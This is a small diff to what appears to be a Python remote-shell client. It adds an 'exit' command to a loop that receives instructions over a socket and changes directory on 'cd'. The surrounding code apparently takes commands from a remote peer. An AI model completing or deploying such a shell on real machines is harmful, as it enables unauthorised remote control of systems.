@@ -21,6 +21,9 @@ try:
     while True:
         data = s.recv(1024)
         print(f"data.decode(): {data.decode()}")
+        if data.decode() == 'exit':
+            s.close()
+            break
         if data[:2].decode() == 'cd':
             os.chdir(data[3:].decode())
         if len(data) > 0:
